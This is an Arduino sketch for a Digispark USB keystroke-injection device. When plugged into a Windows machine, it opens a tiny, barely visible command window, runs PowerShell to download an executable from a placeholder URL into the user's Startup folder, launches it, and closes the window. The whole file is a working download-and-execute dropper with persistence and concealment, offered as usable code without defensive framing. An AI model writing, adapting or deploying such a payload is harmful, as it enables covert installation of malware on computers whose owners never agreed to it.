#include "DigiKeyboard.h"

#define DOWNLOAD_URL "https://youraddress.com/program.exe" 
#define TARGET_PATH "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\program.exe"

void setup() {
  pinMode(1, OUTPUT); 
  DigiKeyboard.delay(3000); //primary delay
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  
  // opening cmd
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(500);
  
  // download and save in startup
  DigiKeyboard.print("powershell -command \"");
  DigiKeyboard.print("(New-Object Net.WebClient).DownloadFile('");
  DigiKeyboard.print(DOWNLOAD_URL);
  DigiKeyboard.print("', '");
  DigiKeyboard.print(TARGET_PATH);
  DigiKeyboard.println("');\"");
  DigiKeyboard.delay(3000);
  
  // execute program
  DigiKeyboard.println("start \"\" \"" TARGET_PATH "\"");
  DigiKeyboard.delay(500);
  
  // close cmd
  DigiKeyboard.println("exit");
  
  while(true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(200);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(200);
  }
  
  while(1); 
}